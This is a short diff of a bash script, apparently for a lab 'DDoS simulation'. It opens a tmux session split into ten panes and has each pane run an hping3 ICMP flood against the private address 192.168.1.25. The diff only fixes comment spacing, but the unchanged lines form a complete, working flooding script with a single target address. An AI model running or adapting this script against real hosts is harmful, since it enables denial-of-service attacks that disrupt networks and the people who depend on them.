@@ -2,7 +2,7 @@
 
 SESSION_NAME="ddos_simulation"
 
-#1. Create a new tmux session in the background
+# 1. Create a new tmux session in the background
 tmux new-session -d -s $SESSION_NAME
 
 # 2. Create 9 additional divisions to make a total of 10 parts within the same screen
@@ -12,7 +12,7 @@ do
     tmux select-layout -t $SESSION_NAME tiled
 done
 
-#3. Automatically send the attack command to each pane and execute it
+# 3. Automatically send the attack command to each pane and execute it
 for pane in $(tmux list-panes -t $SESSION_NAME -F '#{pane_id}')
 do
     tmux send-keys -t "$pane" "sudo hping3 --icmp --flood 192.168.1.25" C-m
